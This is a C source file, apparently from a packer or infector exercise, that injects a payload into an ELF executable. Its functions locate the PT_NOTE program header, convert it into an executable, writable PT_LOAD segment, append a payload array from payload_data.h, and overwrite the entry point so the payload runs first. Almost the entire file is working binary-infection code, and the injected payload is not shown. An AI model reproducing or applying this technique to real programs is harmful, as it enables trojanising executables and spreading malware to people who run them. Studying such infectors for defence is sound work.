#include "../includes/woody.h"
#include "payload_data.h"



void read_store_elf_header(const char *filename, t_woodyData *data) {
    data->fd = open(filename, O_RDONLY);
    if (data->fd < 3) {
        printf("Couldnt open filename %s\n", filename);
        exit(1);
    }
    ssize_t bytes_read = read(data->fd, &data->elf_hdr, sizeof(Elf64_Ehdr));
    if (bytes_read == -1 || bytes_read != sizeof(Elf64_Ehdr)) {
        printf("couldnt read %s correctly\n", filename);
        exit(1);
    }
}

Elf64_Phdr read_phdrs_store_ptnote(t_woodyData *data) {
    ssize_t bytes_read = 0;
    for (int i = 0; i < data->elf_hdr.e_phnum; i++) {
        Elf64_Phdr current;
        int offset = data->elf_hdr.e_phoff + i * data->elf_hdr.e_phentsize;
        lseek(data->fd, offset, SEEK_SET);
        memset(&current, 0, sizeof(Elf64_Phdr));
        bytes_read = read(data->fd, &current, data->elf_hdr.e_phentsize);
        if (bytes_read != data->elf_hdr.e_phentsize) {
            printf("Couldnt read program headers correctly\n");
            exit(1);
        }
        if (current.p_type == PT_NOTE) {
            data->offset_ptnote = offset; 
            printf("pt_note found\n");
            return current;
        }
    }
    printf("Fatal, didnt find any PT_Note program header");
    exit(1);
}

t_woodyData read_store_headers(const char *filename) {
    t_woodyData data;

    memset(&data, 0, sizeof(t_woodyData));
    read_store_elf_header(filename, &data);
    data.pt_note = read_phdrs_store_ptnote(&data);

    return data;
}

void change_pt_note(t_woodyData *data) {
    memcpy(&data->pt_load, &data->pt_note, sizeof(Elf64_Phdr));


    uint64_t injection_addr = 0xc000000 +  data->file_size;

    data->pt_load.p_type = PT_LOAD; // pt_note to pt_load en changeant type
    data->pt_load.p_flags = PF_X | PF_W | PF_R; // pt_note to pt_load en changeant type
    data->pt_load.p_offset = data->file_size;
    data->pt_load.p_vaddr = injection_addr;
    data->pt_load.p_paddr = injection_addr;
    data->pt_load.p_filesz = data->payload_size; 
    data->pt_load.p_memsz = data->payload_size;
    data->pt_load.p_align = 0x1000;
    data->new_entrypoint = (void *)data->pt_load.p_vaddr;
}

void write_file(t_woodyData *data) {
    lseek(data->fd, 0, SEEK_SET); // on repart au debut du fichier
    int fd_out = open("output", O_WRONLY | O_CREAT | O_TRUNC | O_APPEND, 0644);
    if (fd_out < 3) {
        perror("could not open file\n");
        exit(1);
    }
    char *output = malloc(data->file_size + data->payload_size + 1);
    if (output == NULL) {
        perror("output malloc failed\n");
        exit(1);
    }
    memset(output, 0, data->file_size + data->payload_size + 1);
    dprintf(1, "malloced\n");
    ssize_t bytes_read = read(data->fd, output, data->file_size);
    if (bytes_read != (ssize_t)data->file_size) {
        perror("read issue\n");
        exit(1);
    }
    dprintf(1, "red %ld \n", bytes_read);

    memcpy(&output[0x18], &data->new_entrypoint, sizeof(void *));
    memcpy(&output[data->offset_ptnote], &data->pt_load, sizeof(Elf64_Phdr));
    memcpy(&output[data->file_size], &code, data->payload_size);

    write(fd_out, output, data->file_size + data->payload_size);

    dprintf(1, "written\n");
}

void infect_file(const char *filename) {
    t_woodyData data = read_store_headers(filename); 
    data.file_size = lseek(data.fd, 0, SEEK_END); // on recup la taille du fichier
    data.payload_size = sizeof(code);
    printf("data->payload size = %d\n", data.payload_size);
    change_pt_note(&data);
    write_file(&data);
}

int main(int argc, char *argv[])
{
    if (argc != 2) {
        printf("Wrong number of args\n");
        return EXIT_FAILURE;
    }
    infect_file(argv[1]);

    return EXIT_SUCCESS;
}
